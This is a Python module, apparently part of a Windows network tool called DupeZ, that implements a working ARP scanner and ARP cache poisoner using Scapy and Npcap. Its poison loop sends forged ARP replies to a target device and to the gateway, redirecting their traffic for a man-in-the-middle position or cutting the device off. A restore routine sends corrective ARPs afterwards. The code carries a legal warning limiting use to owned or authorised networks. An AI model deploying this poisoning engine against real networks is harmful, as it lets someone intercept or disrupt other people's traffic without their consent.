"""
Npcap L2 Engine — Phase 1 prototype.

Standalone ARP scanner / poisoner / restorer built on Scapy + Npcap.
This is the reach layer that WinDivert cannot provide: WinDivert runs
at L3/L4 on the *local* host stack, so it can only filter this machine's
own traffic. This engine runs at L2 and can redirect traffic between
*other* LAN devices and the gateway by poisoning their ARP caches —
the same primitive NetCut/Bettercap use.

Phase 1 scope (this file):
    * Interface enumeration
    * ARP subnet scan
    * Threaded ARP poison loop (gratuitous ARP @ 1Hz by default)
    * ARP restore (corrective ARPs + stop)
    * NO GUI wiring, NO EngineRouter integration, NO forwarding logic

Phase 2+ will wrap this in DisruptionEngineBase and add selective
drop/forward via an Npcap bridge. For now this module is importable
and usable from a REPL or smoke-test script only.

Dependencies:
    * scapy >= 2.6.0 (already in requirements.txt)
    * Npcap installed in "WinPcap API-compatible mode"
      (https://npcap.com/#download)
    * Administrator privileges (raw socket send)

LEGAL / ETHICAL BOUNDARY
------------------------
ARP poisoning on a network you do NOT own or have explicit written
permission to test on is a crime in most jurisdictions (US CFAA, UK
CMA, EU equivalents). This module is intended for:

    * Your own home LAN
    * A lab/test network you own
    * A pentest engagement with written authorization

Do not run this against hotels, coffee shops, schools, offices, or
any network you don't own. The GUI integration in Phase 2 will gate
activation behind an explicit "I own this network" acknowledgment.

REFERENCE
---------
State machine ported in spirit from Bettercap's arp.spoof module.
See docs/research/netcut-analysis.md for the full architecture rationale.
"""

from __future__ import annotations

import ipaddress
import logging
import socket
import threading
import time
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Tuple

log = logging.getLogger(__name__)

# ── Scapy import guard ───────────────────────────────────────────────
#
# Scapy + Npcap may not be importable on every dev machine (no Npcap
# installed, wrong Python, etc.). Import lazily so the rest of DupeZ
# keeps working even when this engine is unavailable.

_SCAPY_IMPORT_ERROR: Optional[BaseException] = None
try:
    from scapy.all import (  # type: ignore
        ARP,
        Ether,
        conf as scapy_conf,
        get_if_addr,
        get_if_hwaddr,
        get_if_list,
        getmacbyip,
        sendp,
        srp,
    )
except Exception as exc:  # pragma: no cover — import-time env check
    _SCAPY_IMPORT_ERROR = exc
    ARP = Ether = None  # type: ignore
    scapy_conf = None  # type: ignore
    get_if_addr = get_if_hwaddr = get_if_list = None  # type: ignore
    getmacbyip = sendp = srp = None  # type: ignore


__all__ = [
    "NpcapL2Engine",
    "LanDevice",
    "PoisonSession",
    "NpcapUnavailableError",
]


class NpcapUnavailableError(RuntimeError):
    """Raised when Scapy/Npcap prerequisites are missing."""


# ── Data classes ─────────────────────────────────────────────────────


@dataclass
class LanDevice:
    """A device discovered on the local subnet via ARP scan."""

    ip: str
    mac: str
    vendor: str = ""
    first_seen: float = field(default_factory=time.time)
    last_seen: float = field(default_factory=time.time)

    def __str__(self) -> str:  # pragma: no cover — cosmetic
        v = f" ({self.vendor})" if self.vendor else ""
        return f"{self.ip} {self.mac}{v}"


@dataclass
class PoisonSession:
    """An active ARP poisoning session against a single target."""

    target_ip: str
    target_mac: str
    gateway_ip: str
    gateway_mac: str
    interval: float  # seconds between gratuitous ARPs
    iface: str
    started_at: float = field(default_factory=time.time)
    stop_event: threading.Event = field(default_factory=threading.Event)
    thread: Optional[threading.Thread] = None
    packets_sent: int = 0


# ── The engine ───────────────────────────────────────────────────────


class NpcapL2Engine:
    """Scapy/Npcap-backed L2 ARP poisoning engine.

    This class is intentionally NOT a ``DisruptionEngineBase`` subclass
    yet — Phase 1 is a standalone library for smoke-testing the core
    primitive. Phase 2 wraps this in the engine interface and wires it
    into the EngineRouter.

    Typical usage::

        eng = NpcapL2Engine()
        if not eng.available:
            print(eng.unavailable_reason)
            return
        eng.pick_interface()              # or eng.set_interface("Ethernet")
        devices = eng.scan()
        eng.poison("192.168.1.42")        # gateway auto-detected
        # ...traffic from .42 now routes through us...
        eng.restore("192.168.1.42")
        eng.shutdown()
    """

    DEFAULT_POISON_INTERVAL = 1.0      # seconds
    RESTORE_BURST_COUNT = 5            # corrective ARPs on restore
    SCAN_TIMEOUT = 2.0                 # seconds per ARP scan request

    def __init__(self) -> None:
        self._iface: Optional[str] = None
        self._iface_ip: Optional[str] = None
        self._iface_mac: Optional[str] = None
        self._gateway_ip: Optional[str] = None
        self._gateway_mac: Optional[str] = None

        self._devices: Dict[str, LanDevice] = {}   # ip -> LanDevice
        self._sessions: Dict[str, PoisonSession] = {}  # target_ip -> session
        self._lock = threading.RLock()

    # ── Availability ────────────────────────────────────────────────

    @property
    def available(self) -> bool:
        """True if Scapy imported and we have at least one usable iface."""
        if _SCAPY_IMPORT_ERROR is not None:
            return False
        try:
            return bool(get_if_list())
        except Exception:
            return False

    @property
    def unavailable_reason(self) -> str:
        if _SCAPY_IMPORT_ERROR is not None:
            return (
                f"Scapy/Npcap import failed: {_SCAPY_IMPORT_ERROR}. "
                "Install Npcap in WinPcap API-compatible mode from "
                "https://npcap.com/#download and ensure scapy>=2.6.0 is "
                "installed in the active Python environment."
            )
        try:
            if not get_if_list():
                return "Npcap reports zero network interfaces."
        except Exception as exc:
            return f"Interface enumeration failed: {exc}"
        return ""

    # ── Interface selection ─────────────────────────────────────────

    def list_interfaces(self) -> List[Tuple[str, str, str]]:
        """Return ``[(iface_name, ip, mac), ...]`` for all usable adapters."""
        self._require_scapy()
        out: List[Tuple[str, str, str]] = []
        for iface in get_if_list():
            try:
                ip = get_if_addr(iface)
                mac = get_if_hwaddr(iface)
            except Exception:
                continue
            if not ip or ip == "0.0.0.0":
                continue
            if not mac or mac == "00:00:00:00:00:00":
                continue
            out.append((iface, ip, mac))
        return out

    def set_interface(self, iface: str) -> None:
        """Explicitly set the working interface by name."""
        self._require_scapy()
        self._iface = iface
        self._iface_ip = get_if_addr(iface)
        self._iface_mac = get_if_hwaddr(iface)
        scapy_conf.iface = iface
        log.info(
            "NpcapL2Engine: interface set to %s (ip=%s mac=%s)",
            iface, self._iface_ip, self._iface_mac,
        )

    def pick_interface(self) -> str:
        """Auto-select the first interface with a private RFC1918 IP.

        Raises NpcapUnavailableError if no candidate exists.
        """
        self._require_scapy()
        candidates = self.list_interfaces()
        if not candidates:
            raise NpcapUnavailableError("No usable network interfaces found.")

        # Prefer RFC1918 addresses (LAN) over APIPA or public IPs.
        rfc1918 = [
            c for c in candidates
            if ipaddress.ip_address(c[1]).is_private
            and not ipaddress.ip_address(c[1]).is_link_local
        ]
        chosen = rfc1918[0] if rfc1918 else candidates[0]
        self.set_interface(chosen[0])
        return chosen[0]

    # ── Gateway discovery ───────────────────────────────────────────

    def detect_gateway(self) -> Tuple[str, str]:
        """Discover the default gateway IP and MAC for the active iface.

        Returns ``(gateway_ip, gateway_mac)`` and caches them on the
        engine. Raises NpcapUnavailableError on failure.
        """
        self._require_scapy()
        if self._iface is None:
            raise NpcapUnavailableError(
                "Call set_interface() or pick_interface() first."
            )

        # Scapy's route table lookup: route.route(dst) returns
        # (iface, output_ip, gateway_ip) for a given destination.
        try:
            iface, _src, gw_ip = scapy_conf.route.route("0.0.0.0")
        except Exception as exc:
            raise NpcapUnavailableError(
                f"Default route lookup failed: {exc}"
            ) from exc

        if not gw_ip or gw_ip == "0.0.0.0":
            raise NpcapUnavailableError(
                "No default gateway present on active interface."
            )

        gw_mac = self._arp_lookup(gw_ip)
        if gw_mac is None:
            raise NpcapUnavailableError(
                f"ARP lookup for gateway {gw_ip} failed — gateway unreachable "
                "or Npcap cannot send/receive on this interface."
            )

        self._gateway_ip = gw_ip
        self._gateway_mac = gw_mac
        log.info(
            "NpcapL2Engine: gateway %s is at %s (via %s)",
            gw_ip, gw_mac, iface,
        )
        return gw_ip, gw_mac

    # ── LAN scan ────────────────────────────────────────────────────

    def scan(self, subnet: Optional[str] = None) -> List[LanDevice]:
        """Run an ARP sweep against *subnet* (default: /24 around our IP).

        Populates ``self._devices`` and returns the fresh list.
        """
        self._require_scapy()
        if self._iface is None:
            self.pick_interface()

        if subnet is None:
            if not self._iface_ip:
                raise NpcapUnavailableError("No IP on active interface.")
            # Collapse to /24 — the common home-LAN case. LAN-wide /16
            # scans take forever and are out of scope for Phase 1.
            net = ipaddress.ip_network(f"{self._iface_ip}/24", strict=False)
            subnet = str(net)

        log.info("NpcapL2Engine: scanning %s on %s", subnet, self._iface)
        pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=subnet)
        try:
            answered, _ = srp(
                pkt,
                iface=self._iface,
                timeout=self.SCAN_TIMEOUT,
                verbose=False,
            )
        except Exception as exc:
            raise NpcapUnavailableError(f"ARP scan failed: {exc}") from exc

        now = time.time()
        with self._lock:
            for _sent, rcv in answered:
                ip = rcv.psrc
                mac = rcv.hwsrc
                existing = self._devices.get(ip)
                if existing:
                    existing.mac = mac
                    existing.last_seen = now
                else:
                    self._devices[ip] = LanDevice(ip=ip, mac=mac,
                                                  first_seen=now,
                                                  last_seen=now)
            devs = list(self._devices.values())

        log.info("NpcapL2Engine: scan found %d devices", len(devs))
        return devs

    @property
    def devices(self) -> List[LanDevice]:
        with self._lock:
            return list(self._devices.values())

    # ── Poison / Restore ────────────────────────────────────────────

    def poison(
        self,
        target_ip: str,
        gateway_ip: Optional[str] = None,
        interval: Optional[float] = None,
    ) -> PoisonSession:
        """Start an ARP poison loop against *target_ip*.

        If *gateway_ip* is omitted, the cached default gateway is used
        (auto-detected on first call). *interval* is seconds between
        gratuitous ARPs; lower = stickier but noisier.

        Idempotent — calling poison() again on an already-poisoned target
        updates the interval and returns the existing session.
        """
        self._require_scapy()
        if self._iface is None:
            self.pick_interface()
        if self._gateway_ip is None or self._gateway_mac is None:
            self.detect_gateway()

        gw_ip = gateway_ip or self._gateway_ip
        assert gw_ip is not None
        gw_mac = (
            self._gateway_mac
            if gw_ip == self._gateway_ip
            else self._arp_lookup(gw_ip)
        )
        if gw_mac is None:
            raise NpcapUnavailableError(
                f"Gateway {gw_ip} MAC could not be resolved."
            )

        target_mac = self._arp_lookup(target_ip)
        if target_mac is None:
            raise NpcapUnavailableError(
                f"Target {target_ip} MAC could not be resolved — "
                "device may be offline or blocking ARP."
            )

        interval = interval or self.DEFAULT_POISON_INTERVAL

        with self._lock:
            session = self._sessions.get(target_ip)
            if session is not None:
                session.interval = interval  # hot-reload interval
                log.info(
                    "NpcapL2Engine: poison already active for %s, "
                    "interval updated to %.2fs", target_ip, interval,
                )
                return session

            session = PoisonSession(
                target_ip=target_ip,
                target_mac=target_mac,
                gateway_ip=gw_ip,
                gateway_mac=gw_mac,
                interval=interval,
                iface=self._iface,  # type: ignore[arg-type]
            )
            t = threading.Thread(
                target=self._poison_loop,
                args=(session,),
                name=f"NpcapPoison-{target_ip}",
                daemon=True,
            )
            session.thread = t
            self._sessions[target_ip] = session
            t.start()

        log.info(
            "NpcapL2Engine: started poisoning %s (gw=%s, interval=%.2fs)",
            target_ip, gw_ip, interval,
        )
        return session

    def restore(self, target_ip: str) -> bool:
        """Stop poisoning *target_ip* and send corrective ARPs.

        Returns True if a session was stopped, False if none was active.
        """
        self._require_scapy()
        with self._lock:
            session = self._sessions.pop(target_ip, None)
        if session is None:
            return False

        session.stop_event.set()
        if session.thread is not None:
            session.thread.join(timeout=session.interval * 2 + 1.0)

        # Fire a burst of corrective ARPs so both sides re-learn the
        # legitimate MACs quickly instead of waiting for cache expiry.
        try:
            self._send_corrective_arps(session)
        except Exception as exc:  # pragma: no cover — best effort
            log.warning(
                "NpcapL2Engine: corrective ARP burst failed for %s: %s",
                target_ip, exc,
            )

        log.info(
            "NpcapL2Engine: restored %s (%d packets sent during session)",
            target_ip, session.packets_sent,
        )
        return True

    def is_poisoning(self, target_ip: str) -> bool:
        with self._lock:
            return target_ip in self._sessions

    @property
    def active_sessions(self) -> List[PoisonSession]:
        with self._lock:
            return list(self._sessions.values())

    def shutdown(self) -> None:
        """Stop all poison sessions and release resources."""
        with self._lock:
            targets = list(self._sessions.keys())
        for ip in targets:
            try:
                self.restore(ip)
            except Exception as exc:  # pragma: no cover
                log.warning("shutdown: restore(%s) failed: %s", ip, exc)
        log.info("NpcapL2Engine: shutdown complete")

    # ── Internal helpers ────────────────────────────────────────────

    def _require_scapy(self) -> None:
        if _SCAPY_IMPORT_ERROR is not None:
            raise NpcapUnavailableError(self.unavailable_reason)

    def _arp_lookup(self, ip: str) -> Optional[str]:
        """Single-shot ARP resolution. Returns MAC string or None."""
        try:
            mac = getmacbyip(ip)
        except Exception as exc:
            log.debug("arp_lookup(%s) failed: %s", ip, exc)
            return None
        if not mac or mac == "00:00:00:00:00:00":
            return None
        return mac

    def _poison_loop(self, session: PoisonSession) -> None:
        """Worker thread: send gratuitous ARPs until stop_event fires.

        Dual poison — we lie to the target about the gateway's MAC AND
        lie to the gateway about the target's MAC. Both halves are
        needed for full bidirectional MITM; omitting either breaks the
        return path and the target just loses connectivity (which is
        still useful for a "kick" action, but not for forwarding).
        """
        # Pre-build the two poison packets once; reuse them each tick.
        # op=2 is ARP reply; hwsrc=OUR mac (the lie); psrc=the IP we're
        # impersonating.
        to_target = Ether(dst=session.target_mac) / ARP(
            op=2,
            pdst=session.target_ip,
            hwdst=session.target_mac,
            psrc=session.gateway_ip,
            hwsrc=self._iface_mac,  # our MAC — the lie
        )
        to_gateway = Ether(dst=session.gateway_mac) / ARP(
            op=2,
            pdst=session.gateway_ip,
            hwdst=session.gateway_mac,
            psrc=session.target_ip,
            hwsrc=self._iface_mac,  # our MAC — the lie
        )

        while not session.stop_event.is_set():
            try:
                sendp(to_target, iface=session.iface, verbose=False)
                sendp(to_gateway, iface=session.iface, verbose=False)
                session.packets_sent += 2
            except Exception as exc:
                log.error(
                    "NpcapL2Engine: poison send failed for %s: %s",
                    session.target_ip, exc,
                )
                # Don't die on a single send error — the NIC may blip.
                # If it stays broken the user will notice and call
                # restore().
            # Sleep in small chunks so stop_event is responsive.
            remaining = session.interval
            chunk = 0.1
            while remaining > 0 and not session.stop_event.is_set():
                time.sleep(min(chunk, remaining))
                remaining -= chunk

    def _send_corrective_arps(self, session: PoisonSession) -> None:
        """Send truthful ARPs so both victims re-learn the real MACs."""
        # Tell target the real gateway MAC.
        correct_target = Ether(dst=session.target_mac) / ARP(
            op=2,
            pdst=session.target_ip,
            hwdst=session.target_mac,
            psrc=session.gateway_ip,
            hwsrc=session.gateway_mac,
        )
        # Tell gateway the real target MAC.
        correct_gateway = Ether(dst=session.gateway_mac) / ARP(
            op=2,
            pdst=session.gateway_ip,
            hwdst=session.gateway_mac,
            psrc=session.target_ip,
            hwsrc=session.target_mac,
        )
        for _ in range(self.RESTORE_BURST_COUNT):
            sendp(correct_target, iface=session.iface, verbose=False)
            sendp(correct_gateway, iface=session.iface, verbose=False)
            time.sleep(0.1)


# ── Smoke test entry point ───────────────────────────────────────────
#
# Run as: python -m app.firewall.npcap_l2_engine
# (Requires admin + Npcap installed.)

def _smoke_test() -> int:  # pragma: no cover — manual test helper
    logging.basicConfig(
        level=logging.INFO,
        format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
    )
    eng = NpcapL2Engine()
    if not eng.available:
        print("UNAVAILABLE:", eng.unavailable_reason)
        return 1

    print("Interfaces:")
    for name, ip, mac in eng.list_interfaces():
        print(f"  {name:40s}  {ip:16s}  {mac}")

    iface = eng.pick_interface()
    print(f"\nUsing interface: {iface}")

    try:
        gw_ip, gw_mac = eng.detect_gateway()
        print(f"Gateway: {gw_ip}  {gw_mac}")
    except NpcapUnavailableError as exc:
        print(f"Gateway detect failed: {exc}")
        return 2

    print("\nScanning /24...")
    devs = eng.scan()
    for d in devs:
        print(f"  {d}")

    print("\n(To test poison/restore, edit _smoke_test and target a "
          "device you own. Not doing it automatically.)")
    return 0


if __name__ == "__main__":  # pragma: no cover
    import sys
    sys.exit(_smoke_test())
